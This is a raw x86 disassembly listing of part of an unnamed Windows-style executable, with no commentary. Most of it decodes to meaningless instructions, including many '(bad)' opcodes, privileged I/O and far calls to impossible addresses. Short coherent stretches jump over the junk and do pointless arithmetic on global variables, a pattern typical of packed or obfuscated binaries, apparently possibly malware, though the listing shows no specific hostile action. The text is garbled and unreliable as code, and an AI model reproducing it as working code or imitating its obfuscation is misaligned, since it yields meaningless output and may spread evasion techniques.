  407b0c:	dec    edi
  407b0d:	call   0x63ddc7cf
  407b12:	sbb    DWORD PTR [esp+edx*2],0x842c6e1a
  407b19:	(bad)  
  407b1a:	das    
  407b1b:	outs   dx,BYTE PTR ds:[esi]
  407b1c:	aaa    
  407b1d:	test   DWORD PTR fs:[ecx+ebp*8+0x33],edx
  407b22:	ds xchg esi,eax
  407b24:	xor    al,0x6d
  407b26:	sbb    al,0x4
  407b28:	mov    edi,0x3e7e3847
  407b2d:	sbb    edi,DWORD PTR [ebx]
  407b2f:	enter  0x850f,0xc6
  407b33:	add    eax,DWORD PTR [eax]
  407b35:	add    BYTE PTR [esi-0x75],ah
  407b38:	inc    ebp
  407b39:	clc    
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433623,0x433667
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433703,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43362b,0x433727
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43373b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4336fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x73f6a3a4,al
  407ba8:	cmp    al,0x80
  407baa:	cmp    BYTE PTR [eax-0x35],0x7e
  407bae:	jle    0x407bd0
  407bb0:	jge    0x407c30
  407bb2:	jle    0x407c05
  407bb4:	dec    esp
  407bb5:	jne    0x407c19
  407bb7:	pop    ds
  407bb8:	sub    BYTE PTR ds:0x75a56b23,0x47
  407bbf:	mov    eax,ds:0x34cdc5a7
  407bc4:	xchg   ecx,eax
  407bc5:	mov    dh,0x0
  407bc7:	enter  0x6b6d,0x49
  407bcb:	ins    BYTE PTR es:[edi],dx
  407bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bcd:	and    DWORD PTR [ebx-0x28c7781],esi
  407bd3:	pushf  
  407bd4:	test   BYTE PTR [edx+0x2f],0x12
  407bd8:	fdivr  QWORD PTR [ebx-0x47b0ad06]
  407bde:	call   0x75376d09
  407be3:	xor    ebp,DWORD PTR [edx-0x3fd3d28]
  407be9:	loopne 0x407c1d
  407beb:	popa   
  407bec:	sbb    al,0x2c
  407bee:	cmp    BYTE PTR [ecx],cl
  407bf0:	sbb    al,0x61
  407bf2:	out    0xa2,al
  407bf4:	dec    esp
  407bf5:	(bad)  
  407bf6:	int    0xf0
  407bf8:	sti    
  407bf9:	sub    BYTE PTR [ebx],dl
  407bfb:	addr16 mov ah,0x4c
  407bfe:	sbb    cl,dh
  407c00:	mov    edi,0x6d6fa9e4
  407c05:	nop
  407c06:	ret    
  407c07:	mov    bl,0xf
  407c09:	mov    ah,0x33
  407c0b:	popf   
  407c0c:	aas    
  407c0d:	push   ds
  407c0e:	nop
  407c0f:	xchg   edi,eax
  407c10:	dec    ecx
  407c11:	ins    DWORD PTR es:[edi],dx
  407c12:	retf   
  407c13:	aas    
  407c14:	sub    al,0xbd
  407c16:	inc    esp
  407c17:	sbb    bl,bl
  407c19:	aas    
  407c1a:	lds    esi,FWORD PTR [edx-0x67]
  407c1d:	inc    ecx
  407c1e:	add    BYTE PTR [edx+0x49],bh
  407c21:	mov    edx,esp
  407c23:	or     BYTE PTR [edx+0x746e4f4e],dh
  407c29:	int    0xf5
  407c2b:	rcr    esp,0x2
  407c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c2f:	out    0x74,al
  407c31:	sub    al,0xb0
  407c33:	cmp    al,0x3b
  407c35:	mov    ebx,0x8b695816
  407c3a:	mov    esi,0x7ba7d05f
  407c3f:	sub    DWORD PTR [ecx+0x6e],edi
  407c42:	adc    DWORD PTR [ebp+esi*8-0x28751fc3],edx
  407c49:	pop    edx
  407c4a:	in     eax,0x8a
  407c4c:	into   
  407c4d:	jb     0x407c65
  407c4f:	es in  al,dx
  407c51:	sub    eax,0xe174bc1d
  407c56:	xchg   ebx,eax
  407c57:	icebp  
  407c58:	imul   edi,DWORD PTR [edx-0x5c],0xfffffff9
  407c5c:	(bad)  
  407c5d:	inc    esi
  407c5e:	sub    BYTE PTR [edx+0x64],dl
  407c61:	xchg   esp,eax
  407c62:	push   es
  407c63:	and    BYTE PTR [esi+0x67296382],dl
  407c69:	jne    0x407bf5
  407c6b:	xchg   BYTE PTR [edi+eiz*2+0x23],ch
  407c6f:	jle    0x407cef
  407c71:	cmp    dh,BYTE PTR [edx+0x41]
  407c74:	in     al,0x7a
  407c76:	retf   
  407c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c79:	or     ecx,ebx
  407c7b:	fistp  QWORD PTR [ebp+ebp*2+0x5c62d8be]
  407c82:	rcl    DWORD PTR ds:0xa7436d1f,1
  407c88:	call   0x960d:0x3afa12c5
  407c8f:	lods   eax,DWORD PTR ds:[esi]
  407c90:	neg    edx
  407c92:	inc    ebx
  407c93:	adc    BYTE PTR cs:[esi+0x18032ef0],bl
  407c9a:	adc    al,BYTE PTR [edx-0x4]
  407c9d:	iret   
  407c9e:	mov    esp,0x965ce853
  407ca3:	inc    edx
  407ca4:	lods   al,BYTE PTR ds:[esi]
  407ca5:	sbb    al,0x70
  407ca7:	inc    esi
  407ca8:	test   eax,0x56f87ce
  407cad:	ja     0x407c45
  407caf:	ins    BYTE PTR es:[edi],dx
  407cb0:	xor    BYTE PTR [edx-0x58],ah
  407cb3:	daa    
  407cb4:	repnz div DWORD PTR [eax+0x74]
  407cb8:	jno    0x407d25
  407cba:	shl    ah,0xc4
  407cbd:	(bad)  
  407cbe:	mov    edx,0xbab276c
  407cc3:	mov    esp,0x977a3ae2
  407cc8:	das    
  407cc9:	sub    eax,0x5cb5add2
  407cce:	inc    ebp
  407ccf:	push   edx
  407cd0:	in     eax,dx
  407cd1:	sahf   
  407cd2:	inc    edi
  407cd3:	outs   dx,DWORD PTR ds:[esi]
  407cd4:	jns    0x407c88
  407cd6:	cmp    esp,esp
  407cd8:	(bad)  
  407cd9:	repnz rcl BYTE PTR fs:[ebx+0x50822127],1
  407ce1:	jb     0x407ca2
  407ce3:	enter  0x302e,0x9d
  407ce7:	cmp    esi,DWORD PTR [ecx-0x70]
  407cea:	jge    0x407d0f
  407cec:	cdq    
  407ced:	ins    DWORD PTR es:[edi],dx
  407cee:	or     eax,0xd0a8589d
  407cf3:	xor    esi,edi
  407cf5:	mov    edx,0x2ad9edb8
  407cfa:	inc    edi
  407cfb:	sti    
  407cfc:	mov    dl,0xa1
  407cfe:	mov    esp,0xaeb1e4f9
  407d03:	jo     0x407cb1
  407d05:	jle    0x407d05
  407d07:	push   ss
  407d08:	sbb    bh,BYTE PTR [edx+0x79c9ed2f]
  407d0e:	dec    edi
  407d0f:	xchg   edx,eax
  407d10:	lahf   
  407d11:	mov    edx,0xe9f71681
  407d16:	mov    gs,WORD PTR [ebx+0x52]
  407d19:	imul   BYTE PTR ds:0x1df79958
  407d1f:	and    dl,BYTE PTR [ebp+0x34475ef8]
  407d25:	jle    0x407d2b
  407d27:	loopne 0x407d52
  407d29:	xor    ebp,DWORD PTR [esi]
  407d2b:	xchg   ecx,eax
  407d2c:	cmp    BYTE PTR [eax],ah
  407d2e:	out    dx,al
  407d2f:	xor    eax,edx
  407d31:	in     al,dx
  407d32:	pop    ds
  407d33:	inc    eax
  407d34:	aad    0x19
  407d36:	ss mov dl,0xeb
  407d39:	rol    BYTE PTR [edi+0x33cc82f],1
  407d3f:	jbe    0x407cf6
  407d41:	push   edi
  407d42:	inc    edi
  407d43:	pop    eax
  407d44:	outs   dx,DWORD PTR ds:[esi]
  407d45:	add    al,0x50
  407d47:	pop    ds
  407d48:	ret    0x65e8
  407d4b:	(bad)  
  407d4e:	push   edi
  407d4f:	fstp   TBYTE PTR [ebp-0x74]
  407d52:	pop    ss
  407d53:	inc    eax
  407d54:	mov    dh,0x1
  407d56:	das    
  407d57:	dec    eax
  407d58:	dec    ebx
  407d59:	adc    DWORD PTR [ebx],ebx
  407d5b:	je     0x407da9
  407d5d:	std    
  407d5e:	lock aad 0x51
  407d61:	and    al,0x50
  407d63:	imul   esi,DWORD PTR [edx+0x60],0xfa6287f4
  407d6a:	mov    ds:0xb454c7ef,eax
  407d6f:	loop   0x407d65
  407d71:	shl    BYTE PTR [ebp+ebx*1+0x5c],1
  407d75:	sahf   
  407d76:	mov    al,0xe
  407d78:	mov    DWORD PTR [ebp-0xf7999ae],esp
  407d7e:	pop    ss
  407d7f:	sub    eax,0xa8c0248a
  407d84:	sbb    DWORD PTR [edi-0x10],ebp
  407d87:	fxch   st(6)
  407d89:	fstp   QWORD PTR [edx+0x20bef905]
  407d8f:	dec    ebx
  407d90:	mov    al,ds:0xd44a5c9
  407d95:	mov    ds:0x351920e3,eax
  407d9a:	or     BYTE PTR [esi],cl
  407d9c:	in     al,0xd
  407d9e:	cli    
  407d9f:	sbb    al,0xb5
  407da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407da2:	dec    eax
  407da3:	add    dh,BYTE PTR [eax-0x52]
  407da6:	icebp  
  407da7:	jp     0x407de4
  407da9:	mov    ebx,0x3c803cf5
  407dae:	mov    eax,ds:0x9006eab8
  407db3:	pop    eax
  407db4:	stos   BYTE PTR es:[edi],al
  407db5:	loop   0x407d37
  407db7:	mov    ch,0x29
  407db9:	gs xchg ebx,eax
  407dbb:	mov    dh,0xb0
  407dbd:	hlt    
  407dbe:	call   0x46e7e20a
  407dc3:	pop    ss
  407dc4:	(bad)  
  407dc6:	es jne 0x407d55
  407dc9:	fwait
  407dca:	stos   BYTE PTR es:[edi],al
  407dcb:	mov    ch,0x49
  407dcd:	sub    DWORD PTR [edx-0x3e2e960],ebp
  407dd3:	retf   
  407dd4:	cwde   
  407dd5:	clc    
  407dd6:	sub    al,0x86
  407dd8:	xor    eax,0xaa6adaf5
  407ddd:	xchg   ecx,eax
  407dde:	fistp  WORD PTR [edx-0x665e5e8]
  407de4:	or     BYTE PTR [ecx-0x51],dh
  407de7:	cmp    DWORD PTR [esi+0x41],edi
  407dea:	pop    ebx
  407deb:	xchg   ebp,eax
  407dec:	div    ch
  407dee:	fdivr  DWORD PTR [eax+0x16]
  407df1:	push   ds
  407df2:	sbb    DWORD PTR [eax+0x14],edx
  407df5:	sub    al,0xb9
  407df7:	jae    0x407db6
  407df9:	and    eax,DWORD PTR [esi+0x62]
  407dfc:	cmp    ch,bl
  407dfe:	cmp    ebp,DWORD PTR [eax-0x2e]
  407e01:	jl     0x407e75
  407e03:	(bad)  
  407e05:	retf   0xb856
  407e08:	sbb    DWORD PTR [eax],ebp
  407e0a:	push   es
  407e0b:	outs   dx,BYTE PTR ds:[esi]
  407e0c:	mov    eax,ds:0xce121e48
  407e11:	repz sar ah,cl
  407e14:	pushf  
  407e15:	mov    esp,0xa26b92eb
  407e1a:	sub    eax,0x234c6374
  407e1f:	js     0x407dc3
  407e21:	popa   
  407e22:	cmp    eax,0x531ac000
  407e27:	dec    ebp
  407e28:	xchg   ebx,eax
  407e29:	sbb    eax,DWORD PTR [edx+0x7f]
  407e2c:	sbb    al,0xe9
  407e2e:	test   BYTE PTR [esi],0x1c
  407e31:	dec    eax
  407e32:	sar    BYTE PTR [ecx-0x3],cl
  407e35:	mov    esi,0x9137f52a
  407e3a:	cs jp  0x407e65
  407e3d:	sub    BYTE PTR [ecx-0x25],bl
  407e40:	inc    ebx
  407e41:	fnstenv [esi]
  407e43:	xchg   edx,eax
  407e44:	push   esp
  407e45:	cmp    BYTE PTR [esi-0x16],cl
  407e48:	pusha  
  407e49:	add    edx,edx
  407e4b:	popa   
  407e4c:	mov    DWORD PTR ds:0x673d9bdd,esp
  407e52:	mov    ebx,0xef475022
  407e57:	xchg   ecx,eax
  407e59:	xlat   BYTE PTR ds:[ebx]
  407e5a:	std    
  407e5b:	and    DWORD PTR [ebx],edi
  407e5d:	arpl   si,bx
  407e5f:	ds out dx,al
  407e61:	pusha  
  407e62:	inc    ecx
  407e63:	sbb    esi,DWORD PTR [edx]
  407e65:	sbb    al,0x1b
  407e67:	add    ch,bh
  407e69:	fild   DWORD PTR [esi+ebp*8+0x63]
  407e6d:	xor    al,0x46
  407e6f:	mov    ah,0x6e
  407e71:	pop    ebp
  407e72:	jp     0x407e10
  407e74:	shl    DWORD PTR [edi],0x24
  407e77:	ins    BYTE PTR es:[edi],dx
  407e78:	lock add ebx,DWORD PTR [eax+0x3a]
  407e7c:	pop    ebx
  407e7d:	mov    al,0x5b
  407e7f:	mov    ebp,0x798a59e5
  407e84:	outs   dx,BYTE PTR ss:[esi]
  407e86:	adc    BYTE PTR [eax-0x2a],0x8a
  407e8a:	adc    eax,DWORD PTR [ebx]
  407e8c:	les    eax,FWORD PTR [esi+ecx*1-0x3d4b73b2]
  407e93:	mov    dl,0x77
  407e95:	sbb    bl,cl
  407e97:	scas   eax,DWORD PTR es:[edi]
  407e98:	(bad)  
  407e99:	xlat   BYTE PTR ds:[ebx]
  407e9a:	in     al,dx
  407e9b:	into   
  407e9c:	(bad)  
  407e9d:	je     0x407e45
  407e9f:	pushf  
  407ea0:	or     eax,0x74b37257
  407ea5:	mov    al,ds:0xc099d20e
  407eaa:	out    0x36,eax
  407eac:	imul   ecx,DWORD PTR [edx],0xffffffe6
  407eaf:	sahf   
  407eb0:	push   ds
  407eb1:	push   ss
  407eb2:	sub    ebx,eax
  407eb4:	cmova  ecx,DWORD PTR [ecx]
  407eb7:	mov    edi,0x76ec70b9
  407ebc:	mov    dl,0xd6
  407ebe:	outs   dx,BYTE PTR ds:[esi]
  407ebf:	mov    dh,0x39
  407ec1:	jle    0x407e77
  407ec3:	ds adc al,0xf3
  407ec6:	xlat   BYTE PTR ds:[ebx]
  407ec7:	or     BYTE PTR [esi-0x5b],0xc5
  407ecb:	retf   
  407ecc:	sar    BYTE PTR [eax],0xd9
  407ecf:	mov    edx,0x611f1d96
  407ed4:	mov    esi,ecx
  407ed6:	mov    eax,0xe3eb5a5d
  407edb:	push   ds
  407edc:	dec    ecx
  407edd:	je     0x407e75
  407edf:	je     0x407ece
  407ee1:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43366f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	test   edx,ecx
  407f1f:	int3   
  407f20:	into   
  407f21:	sub    dl,dh
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	outs   dx,BYTE PTR ds:[esi]
  407f2a:	shl    BYTE PTR [esi-0x64],0x68
  407f2e:	jne    0x407f79
  407f30:	push   cs
  407f31:	jmp    0x407ec7
  407f33:	and    BYTE PTR [edx*1-0x586d138d],bh
  407f3a:	ror    DWORD PTR [edi+edx*4+0x73],0xbe
  407f3f:	fs cld 
  407f41:	(bad)  
  407f42:	icebp  
  407f43:	aaa    
  407f44:	mov    cl,0x8b
  407f46:	jecxz  0x407f2a
  407f48:	aad    0x53
  407f4a:	mov    ah,0x58
  407f4c:	lods   al,BYTE PTR ds:[esi]
  407f4d:	(bad)  
  407f4e:	sub    al,0xf1
  407f50:	fdiv   st,st(6)
  407f52:	xchg   DWORD PTR [eax+0x2b],esp
  407f55:	jno    0x407f53
  407f57:	push   ss
  407f58:	int3   
  407f59:	or     dl,cl
  407f5b:	ss das 
  407f5d:	cmp    DWORD PTR [ecx-0x17],0xdc39ee3d
  407f64:	cmp    BYTE PTR [ebp-0x1be9b75f],0x97
  407f6b:	push   ebp
  407f6c:	xchg   BYTE PTR [eiz*2-0x4721e070],al
  407f73:	jb     0x407f56
  407f75:	push   esp
  407f76:	push   cs
  407f77:	(bad)  [ecx-0x47]
  407f7a:	mov    WORD PTR ds:0x32846a43,ds
  407f80:	dec    eax
  407f81:	xchg   edi,eax
  407f82:	test   BYTE PTR [eax-0x48],ah
  407f85:	cmp    BYTE PTR [eax],dl
  407f87:	sub    al,0x72
  407f89:	pop    edx
  407f8a:	pop    ebp
  407f8b:	sbb    ebx,DWORD PTR [esi]
  407f8d:	mov    ah,0xcf
  407f8f:	dec    ebp
  407f90:	imul   DWORD PTR ds:0xd65751
  407f96:	xchg   ecx,eax
  407f97:	cmc    
  407f98:	pop    esi
  407f99:	popa   
  407f9a:	fbld   TBYTE PTR [ebx-0x2ae4c637]
  407fa0:	inc    ebp
  407fa1:	jle    0x407f89
  407fa3:	mov    dl,0x9d
  407fa5:	in     al,0xfa
  407fa7:	xor    eax,ebp
  407fa9:	into   
  407faa:	xchg   ebp,eax
  407fab:	fild   QWORD PTR [eax+0x3]
  407fae:	cmp    BYTE PTR [ebx-0xfe26f20],dl
  407fb4:	(bad)  
  407fb5:	jnp    0x407f4d
  407fb7:	pop    ebx
  407fb8:	cs xor al,0xa5
  407fbb:	xlat   BYTE PTR ds:[ebx]
  407fbc:	or     ebp,0xba354936
  407fc2:	sub    ebp,DWORD PTR [esp+ecx*8-0x114aadd8]
  407fc9:	dec    ebp
  407fca:	fdiv   st,st(0)
  407fcc:	push   0x4c
  407fce:	not    BYTE PTR [ecx-0x13]
  407fd1:	int    0x39
  407fd3:	out    0xf5,eax
  407fd5:	ds fdivp st(5),st
  407fd8:	push   esp
  407fd9:	imul   ecx,DWORD PTR [edx-0x15],0xffffffc4
  407fdd:	add    al,0x93
  407fdf:	int3   
  407fe0:	arpl   WORD PTR [edi],bx
  407fe2:	cmp    DWORD PTR [ebx+edi*1],0xffffff95
  407fe6:	mov    al,0x51
  407fe8:	adc    bh,BYTE PTR [ecx+0x23]
  407feb:	push   cs
  407fec:	sub    cl,ah
  407fee:	ins    DWORD PTR es:[edi],dx
  407fef:	add    DWORD PTR [edi+0x22],0x6b
  407ff3:	adc    ah,dh
  407ff5:	jnp    0x407f79
  407ff7:	fucomip st,st(7)
  407ff9:	ret    0xd8b
  407ffc:	cmp    BYTE PTR [ecx+0x6150ab2e],bl
  408002:	sub    eax,ebp
  408004:	call   0xdb66047
  408009:	mov    esi,0x430dcd1b
  40800e:	xchg   esi,eax
  40800f:	push   es
  408010:	cmc    
  408011:	mov    BYTE PTR [ebx],ah
  408013:	pop    esi
  408014:	lods   al,BYTE PTR ds:[esi]
  408015:	cmp    eax,DWORD PTR [eax]
  408017:	loope  0x407fa9
  408019:	loop   0x407fca
  40801b:	(bad)  
  40801c:	xchg   ecx,eax
  40801d:	xor    eax,edi
  40801f:	fadd   QWORD PTR [eax-0x2576454b]
  408025:	cmp    DWORD PTR [eax+0x471153ac],ecx
  40802b:	scas   eax,DWORD PTR es:[edi]
  40802c:	rcl    ebp,1
  40802e:	call   DWORD PTR [ebx]
  408030:	jnp    0x407fef
  408032:	sbb    bl,BYTE PTR [edi-0x11bd03a2]
  408038:	aam    0x27
  40803a:	cwde   
  40803b:	cmp    BYTE PTR [ebx-0x4c0e0a5e],ah
  408041:	out    dx,al
  408042:	mov    ecx,0xe36f649c
  408047:	data16 fisttp WORD PTR [ecx+0x6be85b1e]
  40804e:	sbb    DWORD PTR [eax-0x34],0xe2ffb14c
  408055:	test   esp,0xf06f3303
  40805b:	mov    eax,ds:0xb7a64fa3
  408060:	push   ebp
  408061:	bound  ecx,QWORD PTR [ebx+0x11a3be6d]
  408067:	cmp    eax,0x47747d97
  40806c:	aas    
  40806d:	loopne 0x408094
  40806f:	js     0x40801f
  408071:	std    
  408072:	in     al,dx
  408073:	pop    ecx
  408074:	or     dl,BYTE PTR ds:0x1164bbd7
  40807a:	xor    al,0x2
  40807c:	fcmovne st,st(1)
  40807e:	jns    0x4080c6
  408080:	push   edi
  408081:	dec    BYTE PTR [esi]
  408083:	jg     0x40809d
  408085:	test   BYTE PTR [ecx],dl
  408087:	in     eax,0x22
  408089:	inc    ebx
  40808a:	scas   eax,DWORD PTR es:[edi]
  40808b:	xchg   esi,eax
  40808c:	mov    esp,0xf6e87c56
  408091:	in     eax,0xd5
  408093:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x433627
  4080ad:	xor    DWORD PTR ds:0x433733,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433737
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4336fb
  4080d7:	add    ecx,DWORD PTR ds:0x43361b
  4080dd:	mov    DWORD PTR ds:0x4336fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433667,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433683,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43361f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4336b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4336b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4336b3,eax
  408121:	cmp    DWORD PTR ds:0x4336b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4336b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4336b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4336b3
  408158:	inc    eax
  408159:	mov    ds:0x4336b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43366b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x8b7f548b
  40818c:	inc    esp
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	ins    DWORD PTR es:[edi],dx
  408196:	xchg   ebx,eax
  408197:	test   BYTE PTR [ebp+0x16],0x35
  40819b:	scas   eax,DWORD PTR es:[edi]
  40819c:	xchg   edi,eax
  40819d:	addr16 pop esp
  40819f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a0:	sar    DWORD PTR [edx],1
  4081a2:	pop    ecx
  4081a3:	inc    ebp
  4081a4:	pop    esi
  4081a5:	out    dx,al
  4081a6:	adc    DWORD PTR [ecx],ebx
  4081a8:	jmp    0x4081ef
  4081aa:	pop    eax
  4081ab:	aad    0x50
  4081ad:	xor    DWORD PTR [esi-0x2b],esi
  4081b0:	(bad)  
  4081b1:	cld    
  4081b2:	(bad)  
  4081b3:	sub    ch,BYTE PTR [ecx]
  4081b5:	cmovp  esi,DWORD PTR [ebp+0x64c0e91d]
  4081bc:	test   BYTE PTR [ecx+0x3658b3b1],bh
  4081c2:	dec    esi
  4081c3:	pop    ecx
  4081c4:	xchg   esi,eax
  4081c5:	aad    0x38
  4081c7:	or     BYTE PTR gs:[edi+0x13],al
  4081cb:	sbb    dl,BYTE PTR [ebp-0x3af9599d]
  4081d1:	pop    ecx
  4081d2:	loop   0x408239
  4081d4:	std    
  4081d5:	dec    ebx
  4081d6:	(bad)  
  4081d7:	das    
  4081d8:	aam    0x69
  4081da:	adc    eax,0x96d94e66
  4081df:	retf   
  4081e0:	cmp    dl,BYTE PTR [ebx]
  4081e2:	and    DWORD PTR [ebp+0x7a],esi
  4081e5:	rcl    BYTE PTR [ecx+esi*8+0x332ccf86],0x30
  4081ed:	mov    esp,0x56812098
  4081f2:	push   edi
  4081f3:	sbb    BYTE PTR [edi+0x5b],dh
  4081f6:	fimul  WORD PTR [eax-0x16]
  4081f9:	in     eax,dx
  4081fa:	mov    edi,edx
  4081fc:	fcom   DWORD PTR [ecx-0x1f]
  4081ff:	(bad)  
  408200:	push   cs
  408201:	sbb    ch,bh
  408203:	push   esi
  408204:	pop    eax
  408205:	out    dx,eax
  408206:	test   eax,0xe1906229
  40820b:	stos   DWORD PTR es:[edi],eax
  40820c:	ja     0x4081d5
  40820e:	stc    
  40820f:	and    BYTE PTR [edx-0x4],ch
  408212:	or     al,0xde
  408214:	adc    al,0x42
  408216:	push   edx
  408217:	int    0x99
  408219:	hlt    
  40821a:	jb     0x4081ac
  40821c:	pop    esi
  40821d:	loop   0x4081ad
  40821f:	cmc    
  408220:	adc    dh,BYTE PTR [esi-0x7c]
  408223:	and    eax,0x332f365
  408228:	leave  
  408229:	xchg   ebp,eax
  40822a:	ins    BYTE PTR es:[edi],dx
  40822b:	sbb    al,BYTE PTR [ebx-0x13]
  40822e:	cli    
  40822f:	stc    
  408230:	inc    edi
  408231:	cmp    eax,0x91530e72
  408236:	adc    esp,eax
  408238:	jb     0x4081f8
  40823a:	or     ah,BYTE PTR [edx-0x75346dc1]
  408240:	sbb    esp,DWORD PTR [ecx]
  408242:	mul    BYTE PTR [edi+0x5d]
  408245:	stc    
  408246:	add    eax,0x77793236
  40824b:	loop   0x4082c2
  40824d:	cmp    BYTE PTR [ecx-0x4315fc11],0x3e
  408254:	dec    edx
  408255:	lock inc esi
  408257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408258:	cs pop ebp
  40825a:	cmp    ebx,0xf837ffee
  408260:	call   0x24a4:0x4e903354
  408267:	cli    
  408268:	(bad)  
  408269:	les    esi,FWORD PTR [ecx+ebx*1-0x153af877]
  408270:	cmp    DWORD PTR [eax-0x63aafcc9],ebx
  408276:	out    dx,eax
  408277:	dec    ebp
  408278:	add    al,0xc2
  40827a:	and    BYTE PTR [eax+0x1c6457c7],dh
  408280:	scas   al,BYTE PTR es:[edi]
  408281:	push   0x37
  408283:	ror    DWORD PTR [ecx+0x6ffda5ef],0x89
  40828a:	sub    eax,0xcafee629
  40828f:	inc    edx
  408290:	cmp    eax,0xdd98e834
  408295:	inc    ebx
  408296:	mov    edi,0x5bc159d8
  40829b:	dec    edi
  40829c:	pop    edi
  40829d:	nop
  40829e:	inc    esi
  40829f:	aad    0x4f
  4082a1:	cmp    eax,0x4abebd55
  4082a6:	je     0x4082d2
  4082a8:	jg     0x408316
  4082aa:	xor    ecx,ebx
  4082ac:	sub    bh,BYTE PTR [ebx-0x49b5c45b]
  4082b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082b3:	xlat   BYTE PTR ds:[ebx]
  4082b4:	rcl    DWORD PTR [edx],1
  4082b6:	repnz out dx,al
  4082b8:	inc    ecx
  4082b9:	cs fwait
  4082bb:	ja     0x4082bf
  4082bd:	(bad)  
  4082bf:	sbb    BYTE PTR [ebx],bh
  4082c1:	push   edi
  4082c2:	sbb    al,0x38
  4082c4:	sahf   
  4082c5:	mov    ch,0xcf
  4082c7:	test   al,0x77
  4082c9:	cmp    BYTE PTR [esi],0xde
  4082cc:	pop    ebx
  4082cd:	mov    eax,0x15a094d4
  4082d2:	icebp  
  4082d3:	jmp    0x6ae5:0x97a04004
  4082da:	shr    DWORD PTR cs:[esi*8-0x5a08713],0xc
  4082e3:	je     0x408285
  4082e5:	fistp  DWORD PTR ds:0xde56f4da
  4082eb:	xchg   BYTE PTR [esi-0x17],cl
  4082ee:	stos   DWORD PTR es:[edi],eax
  4082ef:	iret   
  4082f0:	icebp  
  4082f1:	or     eax,0x18f47ff8
  4082f6:	data16 xor bh,al
  4082f9:	mov    eax,ds:0x672d828c
  4082fe:	div    DWORD PTR [ebx]
  408300:	rol    DWORD PTR [ecx+0x43367f25],0x0
  408307:	jo     0x40831c
  408309:	add    BYTE PTR [eax],al
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433623,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4336af,0x433743
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4336bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43367b,0x2005
